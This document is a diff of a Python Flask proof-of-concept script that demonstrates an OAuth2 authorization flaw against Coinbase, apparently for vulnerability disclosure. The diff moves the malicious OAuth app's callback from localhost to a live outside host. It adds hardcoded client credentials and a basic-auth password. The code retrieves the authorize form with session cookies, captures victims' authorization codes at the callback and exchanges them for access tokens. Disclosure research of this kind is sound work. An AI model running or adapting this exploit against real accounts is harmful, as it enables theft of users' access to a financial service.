@@ -10,7 +10,7 @@ import json
 from BeautifulSoup import BeautifulSoup
 from flask import Flask, request, render_template
 
-#from flask.ext.basicauth import BasicAuth
+from flask.ext.basicauth import BasicAuth
 
 # This is a very rough PoC script but it should be enough to demonstate the vulnerability. When one user loads the OAuth authorize page
 # for an attacker's OAuth2 app, they can get correct values for authenticity token, which can then be used to submit an confirm
@@ -19,9 +19,9 @@ from flask import Flask, request, render_template
 
 # Credentials for malicious OAuth2 application
 
-CLIENT_ID = '8599dc2e5a8c779789b6f2f6bb594fa7a18286755801a165eee2be4a4fd846c9'
-CLIENT_SECRET = '978c0846cd6a52c87ac17debe57112fcc99ade59032dd9c92390f90456e7716a'
-CALLBACK_URL = 'http://localhost:8443/callback'
+CLIENT_ID = '5e314a8ff22aeae05ad632ea601fcb6600627625ed3b24f02fae4699a5fce89e'
+CLIENT_SECRET = '30b679b7307b5d2c2c2b8820f0b18ccbaed2c0ff74a7c98e7386e5e9457a81bb'
+CALLBACK_URL = 'http://tor.totalimpact.ie:8443/callback'
 OAUTH_URL = 'https://coinbase.com/oauth/authorize?response_type=code&client_id=' + CLIENT_ID + '&redirect_uri=' + CALLBACK_URL
 
 # These are currently session cookies for a test user just to retrieve the OAUTH form and tokens. Your
@@ -72,13 +72,13 @@ def getAccessToken(code_token):
 app = Flask(__name__)
 
 # Authentication for live instance
-#app.config['BASIC_AUTH_USERNAME'] = 'coinbase'
-#app.config['BASIC_AUTH_PASSWORD'] = 'securityP0C'
-#app.config['BASIC_AUTH_FORCE'] = True
-#basic_auth = BasicAuth(app)
+app.config['BASIC_AUTH_USERNAME'] = 'coinbase'
+app.config['BASIC_AUTH_PASSWORD'] = 'securityP0C'
+app.config['BASIC_AUTH_FORCE'] = True
+basic_auth = BasicAuth(app)
 
 @app.route('/')
-#@basic_auth.required
+@basic_auth.required
 def index():
     # Retrieve authorization form and return it to the user
     return render_template('index.html', oauthform=retrieveOAuthForm(OAUTH_URL, cookie).decode('utf-8'))
@@ -86,7 +86,7 @@ def index():
 
 # Retrieve the code token from the callback, get the access token and make some tests.
 @app.route('/callback')
-#@basic_auth.required
+@basic_auth.required
 def callbackPage():
     code_token = str(request.args.get('code', ''))
     print 'Callback Code: ' + code_token  # Log code to stdout
